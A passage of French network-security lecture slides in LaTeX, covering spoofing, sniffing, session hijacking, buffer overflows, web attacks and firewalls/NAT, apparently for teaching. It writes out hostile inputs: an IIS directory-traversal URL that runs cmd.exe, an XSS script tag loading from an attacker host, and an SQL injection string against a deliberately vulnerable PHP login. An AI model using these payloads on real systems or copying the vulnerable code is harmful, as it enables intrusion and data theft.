+\item Le 16 février un pirate nommé Mafiaboy était suspecté d'avoir perpétré cesattaques: il fut arrété le 15 avril, il s'agissat d'un canadien de 15 ans.
+\item Il avait compromis 75 ordinateurs différents grâce à une faille dans leurs serveurs FTP. 
+\end{itemize}
+\end{frame}
+
+\subsection{IP spoofing}
+
+\begin{frame}
+\frametitle{IP spoofing}
+
+Le spoofing d'IP consiste en la falsification d'adresse IP.
+
+Dans de nombreux cas des paquets de données sont traités différemment en fonction de leur adresse IP d'origine
+\begin{itemize}
+\item Un routeur ou un pare-feu peut laisser des paquets qui proviennent de sites \textit{amis}. 
+
+\item Certaines applications offrent des privilèges aux connexions qui émanent de sous-réseaux connus.
+
+\item Par exemple \texttt{rsh} sous Unix peut permettre l'exécution de commande sans authentification préalable, il vérifient que l'adresse IP d'origine fait partie d'une liste d'adresse IP amie. 
+
+\end{itemize}
+
+Un pirate peut usurper cette confiance en falsifiant l'adresse source de ces paquets.
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Le Spoofing d'IP lors d'une session TCP}
+
+Il est particulièrement difficile de réussir une attaque par spoofing lors d'une session TCP:
+\begin{itemize}
+\item Si le pirate remplace son IP par une autre adresse, la cible enverra ses réponses à l'adresse falsifiée.
+\item C'est gênant car l'initialisation d'une session TCP passe par une séquence de SYN,SYN-ACK,ACK.
+\item Si le pirate ne peut pas répondre au SYN-ACK, il ne peut envoyer des données.
+\end{itemize}
+Dans certains cas on peut contourner ce problème.
+\end{frame}
+
+\begin{frame}
+\frametitle{TCP spoofing dans le même sous-réseau}
+
+Si l'attaquant est dans le même sous-réseau que l'adresse falsifiée:
+\begin{itemize}
+\item il pourra observer les réponses même si elle ne lui sont pas destinée.
+\item il verra l'ISN que le serveur propose dans le SYN-ACK.
+\item il pourra faire une réponse ACK valide, et envoyer des données sous une fausse IP.
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{TCP spoofing à l'aveugle}
+
+Si l'attaquant n'est ni dans le sous-réseau de la cible ni dans celui de la machine dont l'adresse IP est usurpée il ne n'observera pas le paquet SYN-ACK.
+Pour qu'il puisse répondre sans recevoir le SYN-ACK, il faut qu'il devine l'ISN contenu dans le SYN-ACK:
+\begin{itemize}
+\item Si la méthode de génération de l'ISN est simple, avec quelques échantillons peuvent suffirent pour généré les prochains ISN.
+\item De vieille version de de Windows et d'Unix utilisaient de simple incrément.
+\item Aujourd'hui des générateurs aléatoires plus efficaces ont été mis en place. L'attaquant peut toujours tenté sa chance en envoyant plusieurs paquets avec différents ISN, les mauvais numéros seront ignorés le bon accepté.
+\end{itemize} 
+\end{frame}
+
+\subsection{Sniffing}
+
+\begin{frame}
+\frametitle{Sniffing}
+\begin{itemize}
+\item Le sniffing consiste à capture du trafic qui circule sur une partie du réseau.
+\item Le but du sniffing est d'exploiter le fait que beaucoup de méthode d'authentification transmettent les mots de passe en clair sur le réseau.
+\item C'est utilisée par les pirates pour étendre leur attaques/réseaux de bots en prenant le contrôle de nouvelles machines.
+\begin{itemize}
+\item Dans les réseaux locaux sans fils, c'est plus facile car le pirate a accès à toutes les données qui transitent.
+\item Dans réseaux locaux cablés en général les machines sont connectés directement à des hubs et donc les trafics sont cloisonnés.
+\end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}
+\frametitle{Sniffing avec de l'ARP spoofing}
+Dans le cas des réseaux locaux cablés, le pirate peut utiliser une attaque de type ARP spoofing pour contourner le cloisonnement:
+\begin{itemize}
+\item Le protocole ARP sert à faire le lien entre adresse IP et adresse Ethernet: pour connaître l'adresse Ethernet associé à une adresse IP on diffuse une requete ARP contenant l'IP.
+\item Les requêtes ARP sont transmises à toutes les machines d'un même sous réseau.
+\item La machine reconnaissant son IP répond en indiquant son adresse Ethernet.
+\item L'ARP spoofing consiste à diffuser de fausses répondes ARP pour donner l'adresse Ethernet du pirate en lieu et place de celle de la cible.
+\item Le traffic sera alors rediriger vers la machine du pirate. 
+\end{itemize}
+
+Notons que l'exécution d'un sniffer demande des droits root sur une machine.
+\end{frame}
+
+\subsection{Vol de session}
+\begin{frame}
+\frametitle{Vol de session}
+Le session hijacking ou vol de session est un moyen de pénétrer dans un système sans avoir besoin de connaître login et password:
+\begin{itemize}
+\item Le pirate attend qu'un utilisateur légitime se connecte à distance au système.
+\item Une fois que l'utilisateur s'est authentifié et que la connexion est établie, le pirate prend le contrôle de la connexion.
+\item La notion de session peut concerner la couche application ou la couche transport comme dans TCP.
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Vol de session TCP}
+Un pirate espionne un client se connectant à un serveur par telnet par TCP (par exemple par Telnet).
+\begin{itemize}
+\item Des l'authentification établie, le pirate peut forger des paquets TCP et envoyer des commandes à la place du client.
+\item Cela peut provoquer des avalanche de paquet d'aquitement car cela perturbe l'ordre normal des numéro de séquence du client.
+\item Cette attaque est plus efficace si l'attaquant bloque la connexion du client avec un déni de service.
+\end{itemize}
+\end{frame}
+
+
+
+\begin{frame}
+\frametitle{Vol de session HTTP}
+\begin{itemize}
+\item Le protocole HTTP n'utilise pas vraiment la notion de session.
+\item En effet chaque requête pour une page web (page HTML, image, etc. ) est traitée de manière indépendante.
+\item Les développeur web contourne ce problème en identifiant les utilisateur grâce à des cookies et des données stockées sur une base de données.
+\item Si un pirate peut espionner les requêtes échangées entre un client et un serveur web, il peut attendre que le client se soit authentifié puis envoyer une requête à sa place. 
+Ayant vu tous les échanges précédents le pirate connaît l'identifiant de connection et peut donc le réutiliser. 
+\end{itemize}
+\end{frame}
+
+
+
+
+
+\section{Exploits}
+
+
+\subsection{Débordement de Tampon} 
+
+\begin{frame}
+\frametitle{Débordement de Tampon}
+
+\begin{itemize}
+\item Technique très  utilisée pour exécuter du code malveillant sur une machine distance.
+
+\item Elle nécessite qu'une ou plusieurs applications critiques (impliquée dans la gestion des connexions extérieurs)
+
+\item La plupart des vers récents utilisent le débordement de tampon (\texttt{buffer overflow})
+
+\begin{definition}
+ Un \emph{buffer} est une zone contig\"ue de blocs mémoires contenant plusieurs instances d'un même type de données.
+\end{definition}
+\item  En langage C cela correspond à la déclaration \texttt{char buffer[N]}. 
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}[fragile]
+\frametitle{Débordement de Tampon}
+
+%\texttt{char buffer[N]}
+La taille \texttt{N} dépend des données stockées lors de l'exécution du programme. Deux types de déclaration:
+\begin{itemize}
+\item En statique (i.e., avec une déclaration  \texttt{char buffer[N]}), l'allocation mémoire se fera lors du chargement du programme.
+\item En dynamique: un seul pointeur est déclaré et l'allocation est faite au cours de l'exécution:
+\begin{block}{}
+\begin{semiverbatim}
+/* pointeur sur variable de type char */
+char *buffer;
+........
+/* Allocation en cours de processus   */
+buffer = (char *) calloc(N,sizeof(char));
+\end{semiverbatim}
+\end{block}
+Le tableau est ici alloué dans la pile (\textit{stack} utilisée par le processus).
+% uniquement si nécessaire et pour la taille $N$ requise.
+%Les données sont alors stockées dans la pile (\textit{stack} utilisée par le processus).
+\end{itemize}
+
+
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Débordement de Tampon}
+\begin{itemize}
+\item Dans les deux cas (statique et dynamique) le terme \textit{débordement} indique que les données en nombre excédant la valeur prévue $N$ vont être stockées dans le tableau \texttt{buffer}.
+\item Ce débordement va avoir une incidence sur l'organisation des données en mémoire.
+\item Pour les tableaux alloués {\blue statiquement}, cela se traduit en général  par un message \textit{segmentation fault}
+\item Pour les tableaux allouées {\blue dynamiquement} cela peut permettre l'exécution de code malveillant contenue dans le débordement.
+\end{itemize}
+Pour cela il faut connaître et utiliser l'organisation de la pile, centre névralgique du processus en cours.
+\end{frame}
+
+
+
+\begin{frame}
+\frametitle{Organisation de la pile}
+
+\begin{itemize}
+\item La pile est une {\blue zone de mémoire  contig\"ue} contenant des données.
+
+\item Elle débute toujours (bas de pile) à une adresse fixe (dépendant de l'architecture).
+
+\item Elle contient:
+\begin{itemize}
+\item les variables locales d'une procédure, 
+\item les paramètres d'appel d'une procédure,
+\item les valeurs de retour d'une procédure
+\item les données permettant la reprise du programme en fin de procédure.
+\end{itemize}
+\item Elle contient ({\blue registre EIP= Extented Instruction Pointer}) le pointeur de la prochaine instruction à exécuter après l'appel de la procédure.
+\end{itemize}
+
+
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Organisation de la pile \texttt{PUSH} et \texttt{POP}}
+
+\begin{itemize}
+\item {\blue Empilement :} le processeur empile ces données au moyen de l'instruction \texttt{PUSH}.
+\item {\blue Dépilement :} le processeur les dépile grâce à la fonction \texttt{POP}.
+\end{itemize}
+\end{frame}
+
+\begin{frame}
+\frametitle{Organisation de la pile : \texttt{ESP} et \texttt{EBP} }
+\begin{itemize}
+\item Le registre \texttt{ESP} (\textit{Extended Stack Pointer}): contient l'adresse du sommet de la pile (l'adresse du dernier élément empilé ou du prochain emplacement vide).
+
+
+\item Le registre \texttt{EBP} (\textit{Extended Base Pointer}): pointe sur une adresse fixe:
+\begin{itemize}
+\item La taille de la pile évolue, donc la position relative des éléments de la pile par rapport au sommet évolue constament.
+\item L'utilisation d'un référentiel fixe (pointant sur le bas  de la pile de données de la fonction.
+\end{itemize}
+
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}[fragile]
+\frametitle{Organisation de la pile : un exemple}
+Considérons le petit programme suivant
+\begin{block}{}
+\begin{semiverbatim}
+void function(int a, int b, int c)
+  \{
+     char buffer1[5];
+     char buffer2[10];
+  \}
+void main()
+  \{
+     function(1,2,3);
+  \}
+\end{semiverbatim}
+\end{block}
+
+
+\end{frame}
+
+\begin{frame}[fragile]
+\frametitle{Organisation de la pile : un exemple}
+\begin{columns}
+\begin{column}{8cm}
+
+\begin{itemize}
+\item On compile ce programme afin de produire un code assembleur
+\begin{center}
+gcc -S -o exemple1.s exemple1.c
+\end{center}
+
+\item L'appel de la fonction \texttt{function} :
+\begin{block}{}
+\begin{semiverbatim}
+\alert<2>{pushl \$3}
+\alert<3>{pushl \$2}
+\alert<4>{pushl \$1}
+call function
+\end{semiverbatim}
+\end{block}
+
+\item L'instruction \texttt{call} provoquera la sauvegarde du pointeur d'instruction \texttt{EIP} dans la pile.
+Après l'exécution du code de \texttt{function} on retourne à l'exécution initiale du code avec l'\texttt{EIP}.
+\end{itemize}
+\end{column}
+\begin{column}{3cm}
+\only<2>{\includegraphics[width=2.8cm]{pile1}}
+\only<3>{\includegraphics[width=2.8cm]{pile2}}
+\only<4>{\includegraphics[width=2.8cm]{pile3}}
+\end{column}
+\end{columns}
+\end{frame}
+
+
+
+
+\begin{frame}[fragile]
+\frametitle{Organisation de la pile : un exemple}
+\begin{columns}
+\begin{column}{8cm}
+On rentre dans le code de \texttt{function}:
+
+\begin{block}{}
+\begin{semiverbatim}
+\alert<2>{pushl \%ebp}
+\alert<3>{pushl \%esp, \%ebp}
+\alert<4>{subl \$20, \%esp}
+\end{semiverbatim}
+\end{block}
+
+\begin{itemize}
+\item  \alert<2>{Le pointeur \texttt{EBP} est sauvegardé dans pile.}
+\item  \alert<2>{La valeur sauvegardée de \texttt{EBP} est appelée \texttt{savedEBP}.}
+\item  \alert<3>{La valeur courante de \texttt{ESP} est stocké dans \texttt{EBP}, l'adressage local de la fonction.}
+\item \alert<4>{L'espace mémoire pour les variables locales de \texttt{function} est crée à partir de \texttt{EBP}.}
+\end{itemize}
+
+%Faire le schéma.. et faire évoluer la pile en fonction des instructions
+\end{column}
+\begin{column}{3cm}
+\only<1>{\includegraphics[width=2.8cm]{pile3bis}}
+\only<2>{\includegraphics[width=2.8cm]{pile4}}
+\only<3>{\includegraphics[width=2.8cm]{pile5}}
+\only<4>{\includegraphics[width=2.8cm]{pile7}}
+\end{column}
+\end{columns}
+\end{frame}
+
+
+\begin{frame}[fragile]
+\frametitle{Débordement de  pile : un exemple}
+
+Avec la disposition des données dans la pile, voyons comment il est possible d'exécuter une autre instruction que celles prévues originellement.
+\begin{block}{}\begin{scriptsize}
+\begin{semiverbatim}
+void function(int a, int b, int c)
+  \{
+     char buffer1[5];
+     char buffer2[10];
+     \alert<2>{int *ret;
+     ret = buffer1 + 12;
+     (*ret) += 8;}
+  \}
+void main()
+  \{ 
+     int x;
+     function(1,2,3);
+     x=1;
+     printf("\%d\\n",x);
+  \}
+\end{semiverbatim}\end{scriptsize}
+\end{block}
+\end{frame}
+
+\begin{frame}
+\frametitle{Débordement de  pile : un exemple}
+\begin{itemize}
+\item Le but est d'écraser l'adresse de retour: i.e. l'adresse de la prochaine instruction à exécuter après \texttt{function} \texttt{RET}
+\item \texttt{RET} est localisé  dans la pile à 12 octets du début du buffer 1:
+\begin{itemize}
+\item 8 octets pour \texttt{buffer1} et \texttt{buffer2}
+
+
+\item et 4 octets pour \texttt{SavedESP} et \texttt{RET} 
+
+\end{itemize}
+\item Nous allons modifier la valeur de \texttt{RET} afin de supprimer l'exécution de \texttt{x = 1;}
+\item Il suffit de faire pointer \texttt{ret} vers \texttt{RET} et ajoutant 12 à \texttt{ret}.
+\item Puis de modifier la valeur pointée par \texttt{ret}, on lui ajoute 8
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}[fragile]
+\begin{block}{Code désassemblé du programme avec \texttt{gdb}}\begin{scriptsize}\begin{semiverbatim}
+(gdb) disassemble main Dump of assembler code for function main: 
+0x8048470  <main>: push \%ebp 
+0x8048471 <main+1>: mov \%esp,\%ebp 
+0x8048473 <main+3>: sub \$0x18,\%esp 
+0x8048476 <main+6>: movl \$0x0,0xfffffffc(\%ebp) 
+0x804847d <main+13>: add \$0xfffffffc,\%esp 
+0x8048480 <main+16>: push \$0x3 
+0x8048482 <main+18>: push \$0x2 
+0x8048484 <main+20>: push \$0x1 
+0x8048486 <main+22>: call 0x8048450 <function> 
+0x804848b <main+27>: add \$0x10,\%esp 
+0x804848e <main+30>: movl \$0x1,0xfffffffc(\%ebp) 
+0x8048495 <main+37>: add \$0xfffffff8,\%esp
+0x8048498 <main+40>: mov 0xfffffffc(\%ebp),\%eax
+0x804849b <main+43>: push \%eax
+0x804849c <main+44>: push  \$0x8048514
+0x80484a1 <main+49>: call 0x8048344  <printf> 
+0x80484a6 <main+54>: add \$0x10,\%es
+0x80484a9 <main+57>: mov \%ebp,\%esp
+0x80484ab <main+59>: pop \%ebp
+0x80484ac <main+60>: ret
+0x80484ad <main+61>: lea 0x0(\%esi),\%esi
+End of assembler dump.
+\end{semiverbatim}
+\end{scriptsize}
+\end{block}
+%La valeur de \texttt{RET} vaut ici \texttt{Ox804848b}. Le but est ici de contourner l'instruction à l'adresse \texttt{Ox804848e} pour exécuter directement celle située à l'adresse 
+\texttt{Ox8048485} d'où le +8.
+\end{frame}
+
+
+
+\begin{frame}
+\frametitle{Débordement de tampon}
+
+Si au lieu de contourner une instruction comme dans l'exemple précédent nous volons en exécuter d'autre:
+\begin{itemize}
+\item Il faut provoquer un débordement de tableau avec des données contenant le code exécutable que l'on souhaite exécuter.
+\item Une nouvelle adresse pointant vers ce nouveau code et des données de bourrage de sorte qu'elle écrase la valeur contenue dans \texttt{RET}
+\item En pratique c'est très technique à effectuer, d'autant plus que les compilateurs et systèmes actuels sécurisent les débordements de tampon.
+\end{itemize}
+\end{frame}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection{Vulnérabilité conceptuelle}
+
+\begin{frame}
+\frametitle{Parcours frauduleux de répertoires dans un serveur web}
+
+\begin{itemize}
+\item Un serveur web donne accès à des répertoires stockées dans des répertoires bien spécifiques.
+\item Ces répertoires sont structurés en arborescence à partir d'une racine.
+\item Un serveur web bien conçu ne doit donner accès à des fichiers non situés sous cette racine.
+\item De nos jour un grand nombre d'appareils et de logiciels sont fournis avec un serveur web intégré.
+\item On peut alors gérer l'appareil à distance avec un simple navigateur.
+\end{itemize}
+\end{frame}
+
+
+
+\begin{frame}
+\frametitle{Parcours frauduleux de répertoires dans un serveur web : exemple}
+\begin{itemize}
+\item Compaq fournit par exemple un logiciel de maintenance à distance d'ordinateurs Compaq sous Windows.
+\begin{center}
+\textit{Compaq Server Management Agent}
+\end{center}
+\item Dans la version 4.0 il était possible d'insérer \texttt{../..} dans une URL et ainsi de remonter dans les répertoires situés au dessus de la racine
+\item Le fichier \texttt{c:\slash interesting\slash document.txt} pouvait par exemple être accédé à l'aide de l'URL
+\begin{center}
+\texttt{http://mon.serveur.com:2301/../../interesting/document.txt}
+\end{center}
+\end{itemize}
+\end{frame}
+
+\begin{frame}
+\frametitle{Parcours frauduleux de répertoires dans un serveur web : exemple}
+
+\begin{itemize}
+\item Une faille semblable pouvait être exploitée dans les serveur web IIS de Microsoft.
+\item On pouvait même faire exécuter des programmes arbitraires sur le serveur en utilisant un encodage spécial.
+\item On introduisait la séquence \texttt{../..} à l'aide des caractères suivants \texttt{..\\\%c0\\\%af..} 
+\item L'URL 
+\begin{center}
+\texttt{http://a.b.com/scripts/..\\\%c0\\\%af../winnt/system32/cmd.exe?/C+dir}
+\end{center}
+permettait par exemple d'exécuter la commande \texttt{dir}.
+\item Le fait que l'URL commen\c cait par \texttt{scripts} faisait croire au serveur que le document était un script et qu'il fallait l'exécuter.
+\end{itemize}
+
+\end{frame}
+
+\subsection{Failles des applications en ligne}
+
+\begin{frame}
+\frametitle{Failles des applications en ligne}
+
+\begin{itemize}
+\item Lorsque des applications en ligne présentent des erreurs, les pirates peuvent les exploiter à distance.
+\begin{itemize}
+\item  pour modifier le site
+\item les bases de données
+\end{itemize}
+\item Il existe de nombre types d'erreurs de programmation de sites web qui permettent à des pirates d'en prendre le contrôle.
+\item L'Open Source Web Application Security Project  recense ces erreurs et aide les développeurs à les éviter.
+\begin{itemize}
+\item  Un top \textit{ten} des erreurs les plus répendues est publié.
+\end{itemize}
+\item Nous allons en décrire brièvement deux classiques.
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Cross Site Scripting}
+
+\begin{itemize}
+\item Le Cross Site Scripting (XSS) consiste à injecter du code malicieux (HTML ou JavaScript) dans une page web.
+\item Pour cela il faut que le site web permette à ses visiteurs de fournir du contenu, et si possible sans le modifier.
+\item Par exemple, un livre d'or dans lequel le visiteur laisse un commentaire, si celui-ci y met du code javascrit, celui-ci sera exécuter dans la page web des futurs visiteurs.
+\end{itemize}
+
+\end{frame}
+
+
+
+\begin{frame}
+\frametitle{Cross Site Scripting}
+
+Le pirate peut aussi choisir d'insérer un script directement, il peut insérer une redirection 
+\begin{center}
+\texttt{<script src="//pirat.es/evil.script.js">}
+\end{center}
+C'est de cette tactique que vient le nom de \textit{cross site scripting}.
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Cross Site Scripting}
+
+Les scripts injectés sont souvent utilisés pour
+\begin{itemize}
+\item faire apparaître des informations erronées
+
+\item faire apparaître un formulaire d'authentification frauduleux qui permettra au pirate de récupérer le nom et le mot de passe de la victime
+
+\item récupérer le cookie de session et l'envoyer au pirate pour qu'il puisse faire un vol de session.
+
+\item enregistrer tout ce que la victime écrit dans les champs des formulaires.
+\item clicker et effectuer des actions à la place de la victime, par exemple pour passer une commande.
+
+\end{itemize}
+\end{frame}
+
+
+\subsection{Injection SQL}
+
+
+\begin{frame}
+\frametitle{Injection SQL}
+
+\begin{itemize}
+\item L'injection SQL consiste à injecter des commandes qui seront interprétées par la base de données d'une application en ligne.
+\item Une base de données est souvent utilisée pour stocker
+\begin{itemize}
+\item les noms des utilisateurs,
+\item les mots de passe des utilisateurs, 
+\item des informations sur des produits,
+\item ou encore les textes d'un site web.
+\end{itemize}
+\item  Pour communiquer avec la base l'application utilise un langage spécifique qui est en général \texttt{SQL}.
+\item Ces commandes pevent contenir de l'information fournie par l'utilisateur de l'application comme un nom ou la référence d'un produit.
+\item Si l'application n'empêche pas l'utilisateur d'injecter du code SQL dans les informations qu'il fournit alors il peut manipuler la base de données.
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}[fragile]
+
+\frametitle{Injection SQL}
+
+\begin{block}{}\begin{scriptsize}
+\begin{semiverbatim}
+\$requete=requete("select Pseudo from t\_user 
+                   where Pseudo='".\$User.'" 
+                   and Passe='".\$Passord."'"); 
+
+if(mysql\_num\_rows(\$requete)==0)
+\{
+  // mauvais mot de passe
+  header("Location:login\_admin\_mediabox404.php?Fct=Bad\_Pseudo");
+\}
+else
+\{
+  // mot de passe ok
+\end{semiverbatim}\end{scriptsize}
+\end{block}
+A l'aide du nom et du mot de passe fournis par l'utilisateur
+\begin{itemize}
+\item l'application crée une requête \texttt{SQL} 
+\item celle-ci vérifie si le nombre d'entrées qui ont ce nom et ce mot de passe est nul,
+\item Si ce n'est pas le cas, l'utilisateur est accepté.
+\end{itemize}
+
+\end{frame}
+
+\begin{frame}[fragile]
+\frametitle{Injection SQL}
+La requête construite pour l'utilisateur \texttt{Guillermo} et le mot de passe \texttt{DePasse} est la suivante
+\begin{block}{}\begin{scriptsize}
+\begin{semiverbatim}
+   select Pseudo from t\_user 
+   where Pseudo='Guillermo' 
+   and Passe='DePasse'
+\end{semiverbatim}\end{scriptsize}
+\end{block}
+Si l'utilisateur avait la bonne idée de l'appeler
+\begin{center}
+\texttt{'OR 1=1 /*}
+\end{center}
+avec un mot de passe vide, la requête prendrait cette forme:
+\begin{block}{}\begin{scriptsize}
+\begin{semiverbatim}
+   select Pseudo from t\_user 
+   where Pseudo=''OR 1=1 /*' 
+   and Passe='DePasse'
+\end{semiverbatim}\end{scriptsize}
+\end{block}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Injection SQL}
+\begin{itemize}
+\item Le simple guillemet inséré par le pirate ferme la chaine de caractères correspondant au nom
+\item Les caractères suivant font partie de la commande SQL.
+\item La condition est '1=1' est toujours vérifiée et '/*' mettra le reste de la requête en commentaire.
+\item La requête listera donc tous les utilisateurs de la base.
+\item Si le pirate connaît le nom de l'administrateur il pourra aussi utiliser le nom 'admin' OR 1=1 /*'.
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}
+
+\begin{itemize}
+\item Les attaques par injection SQL peuvent avoir des conséquences désastreuses en donnant accès à toutes les données stockées sur la base.
+
+\item La meilleure défense contre ce type d'attaque est de vérifier si les informations fournies par les utilisateurs sont conformes au format attendu.
+
+\item Si des caractères spéciaux comme les guillemets sont autorisés, alors il doivent être traités afin de ne pas avoir d'effet sur les pages web.
+\end{itemize}
+\end{frame}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Pare-feux: translation, filtrage, et proxies %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\section{Pare-feux}
+
+
+\begin{frame}
+\frametitle{Qu'est ce qu'un pare-feu}
+\begin{itemize}
+\item Les pare-feux sont des composants d'un réseau utilisés chaque fois que l'on désire interconnecter deux réseaux possédant un niveau de sécurité différent.
+
+\item La fonction primitive d'un pare-feu est d'éviter la propagation d'un incendie.
+
+\item De fa\c con analogue dans le contexte des réseaux, un pare-feu doit prévenir la propagation d'une attaque entre les différents réseaux qu'il relie.
+
+\end{itemize}
+\end{frame}
+
+\begin{frame}
+\frametitle{Principes de base}
+
+\begin{itemize}
+\item {\color{blue} Moindre privilège:}  chaque utilisateur et chaque module d'un système ne doit posséder que des droits minimaux nécessaires.
+
+\textit{{\color{grey} Exemple :} un serveur Web a des droits minimaux (nobody pour UNIX et IUSR pour Window): lecture des documents et écriture dans des journaux. }
+\item {\color{blue} Défense en profondeur:}  consiste à utiliser plusieurs mécanismes de protection redondants.  
+
+
+\textit{{\color{grey} Exemple :} si les connexions entrantes FTP sont bloquées, il est nécessaire de désactiver les serveurs FTP inutilisés installés par défaut. }
+\item {\color{blue} Goulet d'étranglement:} Limiter les points d'entrée à un réseau: il vaut mieux que le trafic passe par un seul point dans lequel tous ce qui transite sera analysé.
+\end{itemize}
+
+\end{frame}
+
+
+
+\begin{frame}
+\frametitle{Principes de base (suite)}
+
+\begin{itemize}
+\item {\color{blue} Maillon le plus faible :}  Un système sera aussi solide que son maillon le plus faible.
+
+
+\item {\color{blue} Déni par défaut :}  Deux stratégie possibles: 
+
+\textit{tout permettre sauf ce qui est explicitement interdit} (dangereux) 
+
+ou 
+
+\textit{tout interdire sauf ce qui est explicitement permis}. 
+
+
+
+\item {\color{blue} Participation des utilisateurs :} Un système de sécurité n'est efficace que si tous les utilisateurs adhèrent à ses principes. Si  le système met trop de contrainte aux utilisateurs, ils auront tendance à contourner ces règle, créant des failles de sécurité.
+\end{itemize}
+
+\end{frame}
+
+\begin{frame}
+\frametitle{Types de pare-feu}
+\begin{itemize}
+\item {\color{blue}Logiciel ou matériel.} logiciel souvent utilisés dans les systèmes des PCs (zonealarm, etc). Matériel (et couche logicielle) dédiés moins sensible au multiple faille des OS généralistes.
+\item {\color{blue}Avec ou sans état.} Sans état, cela signifie que les paquets sont analysés indépendemment des uns des autres. Avec mémoire l'analyse se fait sur un flux de paquet (connextion TCP par exemple).
+
+\textit{{\color{grey} Exemple :}  un paquet d'acquittement TCP ne peut être recu avant l'échange des paquets SYN et ACK.
+ }
+\end{itemize}
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Pare-feu avec état :   SYN retardée}
+
+\begin{center}
+\includegraphics[height=7cm]{FiguresNAT/strategie2-blocage-syn}
+\end{center}
+Ici le pare-feu mémorise temporairement les SYN entrant en attendant d'avoir la réponse ACK évitant un SYN flooding.
+\end{frame}
+
+
+
+\subsection{Translation d'adresse}
+
+\begin{frame}
+\frametitle{Translation d'adresse - Rappel}
+
+\begin{center}
+\includegraphics[width=9cm]{FiguresNAT/nat0.pdf}
+\end{center}
+\begin{small}
+\begin{tabular}{cc}
+\begin{tabular}{cc}
+Tous les datagrammes quittant le \\
+réseau local ont \\
+la même adresse IP source:\\
+138.76.29.7 \\ 
+mais différents numéros de port \\
+source 
+\end{tabular}
+\begin{tabular}{cc}
+Les datagrammes avec une source \\
+ou une destination dans ce réseau \\
+ont 10.0.0.0/24 pour adresse \\
+réseau pour la source (ou \\
+la destination) \\
+\end{tabular}
+\end{tabular}
+\end{small}
+
+\end{frame}
+
+
+\begin{frame}
+\frametitle{Translation d'adresse - Rappel}
+\begin{itemize}
+\item Il permet à plusieurs machines d'accéder à Internet en utilisant une seule adresse externe.
+\item Le principe est d'identifier les \alert{adresse+port} du sous réseau 10.0.0.0 par un \alert{numéro de port}.
+\item Le routeur est alors chargé de faire les changements \alert{adresse/port} par \alert{adresse publique/port} associé lorsque les paquets sortent ou rentrent.
+\end{itemize}
+\end{frame}
+
+\begin{frame}
+%Il permet à plusieurs machines d'accéder à Internet en utilisant une seule adresse externe.
+\begin{center}
+\includegraphics[width=9cm]{FiguresNAT/nat1.pdf}
+\end{center}
+\begin{small}
+\begin{tabular}{cc}
+\begin{tabular}{l}
+\ding{192} L'hote 10.0.0.1 envoie un \\
+datagramme à 128.119.40.186, 80. \\
+\ding{193} le routeur NAT change  \\
+adresse/port source 10.0.0.1, 3345  \\
+en 138.76.29.7, 5001. \\
+\ding{194} La réponse arrive: adresse de \\
+destination est 138.76.29.7, 5001. \\
+\ding{195} Le routeur change adresse/port \\
+de destination 138.76.29.7, 5001 \\
+en 10.0.0.1, 3345. \\
+\end{tabular}
+ \begin{tabular}{|c|c|}
+\hline
+\multicolumn{2}{|c|}{Table de translation } \\
+\hline
+addr. côté WAN & addr côté LAN \\
+138.76.29.7, 5001 & 10.0.0.1, 3345 \\
+$\cdots\cdots$ & $\cdots\cdots$ \\
+\hline
+\end{tabular}
+\end{tabular}
+\end{small}
+
+\end{frame}
+
+
+
+\begin{frame}
+\frametitle{NAT dynamique et NAT statique}
+
+\begin{itemize}
+\item Le NAT dynamique est le mode le plus utilisé (déjà vu dans le chapitre couche réseau): la table de translation se rempli et se vide au fur et a mesure que les connexions sont ouvertes ou fermées.
+\item La translation statique consiste à prédéfinir des relations entre adresse/port publique et adresse/port privé. Cela permet de donner accès au monde extérieur à des serveurs de la zone privée.
+\end{itemize}
+
+\begin{center}
+\begin{tabular}{|cccc|cccc|}
+\multicolumn{4}{c}{externe} & \multicolumn{4}{c}{interne} \\
+\hline
+source & port & dest. & port & source & port & dest. & port \\
+\hline
+10.0.0.1 & 25 & &  & 172.1.3.2 & 25 & &  \\
+10.0.0.2 & 8080 & &  & 172.1.3.2 & 80 & &  \\
+\hline
+\end{tabular}
+\end{center}
+
+
+\end{frame}
+
+
+\subsection{Architecture de pare-feux}
+\begin{frame}
+\frametitle{Pare-feu personnel}
+Un pare-feu peut être utilisé pour sécuriser un simple PC connecté à Internet via un modem.
+
+\begin{columns}
+\begin{column}{0.5\textwidth}
+\begin{center}
+\includegraphics[height=5cm]{FiguresNAT/pare-feu-simple.pdf}
+\end{center}
+\end{column}
+
+
+\begin{column}{0.5\textwidth}
+\begin{itemize}
+\item Par défauts ces logiciels pare-feu bloquent toutes les connexions entrantes et sortantes.
+\item A chaque nouvelle connexion un message s'affiche, demandant l'autorisation de l'utilisateur.
+\item Cette autorisation peut être appliquée durablement dans le temps.
+\end{itemize}
+\end{column}
+
+\end{columns}
+\end{frame}
+
+\begin{frame}
+\frametitle{NAT et filtrage}
+
+\begin{center}
+\includegraphics[width=9cm]{FiguresNAT/pare-feu-et-nat}
+\end{center}
+
+\end{frame}
+
+
+\begin{frame}
+\frametitle{NAT et filtrage}
+\begin{small}
+\begin{itemize}
+\item {\color{blue} Configuration standard.} 
+\begin{itemize}
+\item Translation dynamique d'adresses pour toutes les adresses internes.
+\item Translation statique d'adresses pour les serveurs devant être accessibles depuis Internet (SMTP, accès HTTP, pour le serveur de courrier électronique).
+\item filtrage des connexions sortantes pour autoriser uniquement les protocoles nécessaires.% (par exemple HTTP, HTTPS, FTP, SMTP, DNS).
+\item Filtrage des connexions entrantes pour interdire les connexions directes sur le pare-feu.
+
